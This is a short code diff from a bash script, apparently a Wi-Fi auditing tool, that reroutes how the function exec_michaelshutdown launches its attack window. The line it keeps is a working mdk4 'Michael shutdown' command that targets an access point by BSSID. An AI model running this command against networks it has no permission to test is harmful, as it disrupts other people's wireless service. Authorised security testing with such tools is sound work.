@@ -3721,7 +3721,9 @@ function exec_michaelshutdown() {
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
-		xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk4 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
+		manage_output "+j -sb -rightbar -geometry ${g1_topleft_window} -T \"michael shutdown attack\"" "mdk4 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
+		wait_for_process "mdk4 ${interface} m -t ${bssid} -w 1 -n 1024 -s 1024" "michael shutdown attack"
+		#xterm +j -sb -rightbar -geometry "${g1_topleft_window}" -T "michael shutdown attack" -e mdk4 "${interface}" m -t "${bssid}" -w 1 -n 1024 -s 1024 > /dev/null 2>&1
 	fi
 }
 
